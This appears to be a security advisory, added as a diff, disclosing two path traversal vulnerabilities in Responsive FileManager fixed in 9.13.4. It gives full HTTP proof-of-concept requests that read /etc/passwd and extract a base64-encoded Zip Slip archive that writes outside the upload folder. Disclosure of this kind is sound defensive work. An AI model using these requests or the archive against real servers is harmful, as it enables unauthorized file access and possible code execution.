@@ -1,0 +1,57 @@
+The following vulnerabilities were fixed in the version 9.13.4.
+https://responsivefilemanager.com
+
+#1 Path Traversal Allows to Read Any File
+
+Reserved CVE: CVE-2018-15535
+Discovered By: Simon Uvarov
+Vendor Status: Fixed
+
+Details:
+
+The following request allows a user to read any file on the system.
+
+    GET /filemanager/ajax_calls.php?action=get_file&sub_action=preview&preview_mode=text&title=source&file=../../../../etc/passwd HTTP/1.1
+    Host: 192.168.5.129
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
+    Accept: */*
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Referer: http://192.168.5.129/filemanager/dialog.php?type=0&popup=1
+    X-Requested-With: XMLHttpRequest
+    Cookie: last_position=%2F; PHPSESSID=na248cef3f937mtql67dvu8fk5
+    Connection: close
+
+#2 Path Traversal While Upacking Archives
+
+Reserved CVE: CVE-2018-15536
+Discovered By: Simon Uvarov
+Vendor Status: Fixed
+
+The following request starts unpacking the exploit.zip archive:
+
+    POST /filemanager/ajax_calls.php?action=extract HTTP/1.1
+    Host: 192.168.5.129
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
+    Accept: */*
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Referer: http://192.168.5.129/filemanager/dialog.php?type=0&lang=en_EN&popup=1&crossdomain=0&relative_url=0&akey=key&fldr=&5b6d9b91535a9&1533909952983
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    X-Requested-With: XMLHttpRequest
+    Content-Length: 16
+    Cookie: last_position=%2F; PHPSESSID=na248cef3f937mtql67dvu8fk5
+    Connection: close
+   
+    path=exploit.zip
+
+Bases64-encoded example of exploit.zip which creates source.txt in /tmp/ directory:
+
+    UEsDBBQAAAAAALZNmkR7I19kDgAAAA4AAAAmAAAALi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdG1w
+    L3NvdXJjZS50eHR1cGxvYWRzIGZvbGRlclBLAQIUAxQAAAAAALZNmkR7I19kDgAAAA4AAAAmAAAA
+    AAAAAAAAAADtgQAAAAAuLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi90bXAvc291cmNlLnR4dFBLBQYA
+    AAAAAQABAFQAAABSAAAAAAA=
+
+It is possible to create archives containing ../../ as a part of a file path, now it's famous as ZipSlip vulnerability, but it's an old bug.
+
+It is impossible to upload .php files or .htaccess file using this method, but itas possible to create different files with "legal" extensions on a system and it may lead to remote code execution if a server runs with enough privileges, for example, to create cron jobs.
